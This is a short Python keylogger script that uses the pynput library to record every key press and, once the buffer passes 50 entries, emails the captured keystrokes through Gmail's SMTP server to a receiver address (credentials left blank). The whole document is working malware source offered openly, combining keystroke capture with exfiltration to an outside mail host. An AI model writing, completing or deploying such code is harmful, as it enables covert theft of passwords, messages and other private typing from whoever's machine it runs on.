from pynput import keyboard
import smtplib

sender_email = ""
receiver_email = ""

subject = "K.log data: "
message = "see: "
buffer = []

def send_email(logged_data):
    text = f"Subject: {subject}\n\n{message}\n\n{buffer}"

    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(sender_email, "")
    server.sendmail(sender_email, receiver_email, text)

def pressed(key):
    print(str(key))
    try:
        buffer.append(str(key))
    except AttributeError:
        buffer.append(f"{str(key)}")
    if len(buffer)>50:
        send_email(buffer)


if __name__ =="__main__":
    listener = keyboard.Listener(on_press=pressed)
    listener.start()
    input()